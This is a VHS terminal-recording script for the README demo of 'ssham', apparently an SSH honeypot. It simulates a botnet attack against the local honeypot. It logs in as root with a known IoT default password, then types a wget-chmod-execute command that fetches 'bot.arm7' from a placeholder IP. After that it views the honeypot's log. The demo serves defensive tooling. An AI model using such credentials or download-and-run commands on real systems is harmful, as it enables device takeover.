# Records the README demo. Run from the repo root:
#
#   vhs .github/demo.tape

Output .github/demo.gif

Require go
Require ssh
Require fx

Set Shell bash
Set FontSize 18
Set Width 1200
Set Height 640
Set Padding 24
Set TypingSpeed 45ms
Set Theme "Catppuccin Mocha"

# Build ssham and start it in a temp dir, so the demo leaves nothing behind.
Hide
Type "export PS1='$ '; d=$(mktemp -d); go build -o $d/ssham . && cd $d"
Enter
Type "./ssham -host-key-dir keys -log ssham.jsonl 2>/dev/null & sleep 1"
Enter
Type "alias ssh='ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o PubkeyAuthentication=no'"
Enter
Sleep 3s
Type "clear"
Enter
Show

# Play the bot.
Type "ssh -p 2222 root@localhost"
Sleep 500ms
Enter
Wait+Screen /password:/
Sleep 500ms
Type "xc3511"
Enter
Wait+Screen /~ #/
Sleep 1s

Type "uname -a"
Sleep 300ms
Enter
Sleep 1.5s

Type "cd /tmp; wget http://203.0.113.7/bot.arm7; chmod +x bot.arm7; ./bot.arm7"
Sleep 300ms
Enter
Sleep 3s
Ctrl+C
Sleep 1s

Type "exit"
Sleep 300ms
Enter
Sleep 1s

# Now look at what ssham wrote down.
Type "fx ssham.jsonl"
Sleep 500ms
Enter
Sleep 2s
Type "/download"
Sleep 500ms
Enter
Sleep 5s

Hide
Type "q"
Type "kill %1; rm -rf $d"
Enter
